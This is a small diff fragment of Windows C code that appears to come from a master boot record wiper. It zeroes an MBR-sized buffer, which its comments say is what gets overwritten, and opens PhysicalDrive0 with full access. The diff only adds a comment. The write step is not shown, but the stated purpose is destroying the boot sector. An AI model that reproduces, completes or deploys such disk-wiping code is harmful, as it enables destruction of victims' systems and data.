@@ -14,6 +14,6 @@ char mbrData[MBR_SIZE];
 
 ZeroMemory(&mbrData, (sizeof mbrData));   // here we use zeromemory to fill the size of mbr with zeros. this is what we are overwriting in it.
 
-HANDLE masterbootrecord =  CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0); 
+HANDLE masterbootrecord =  CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);  // path to the MBR
 CloseHandle(masterbootrecord);
  }
